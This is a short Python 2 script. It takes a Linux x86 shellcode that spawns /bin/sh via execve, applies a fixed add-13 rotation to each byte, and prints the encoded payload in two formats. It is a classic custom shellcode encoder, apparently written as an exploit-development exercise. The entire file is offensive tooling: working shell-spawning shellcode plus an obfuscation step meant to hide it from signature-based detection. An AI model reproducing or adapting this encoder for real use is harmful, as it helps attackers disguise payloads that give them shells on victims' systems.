#!/bin/python

shellcode = ("\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80")

magic = 13

encoded1 = ""
encoded2 = ""

for i in bytearray(shellcode):
	j = (i + magic)%256
	encoded1 += '\\x'
	encoded1 += '%02x' %j

	encoded2 += '0x'
	encoded2 += '%02x, ' %j

print "Format 1: {0}".format(encoded1)
print "Format 2: {0}".format(encoded2)
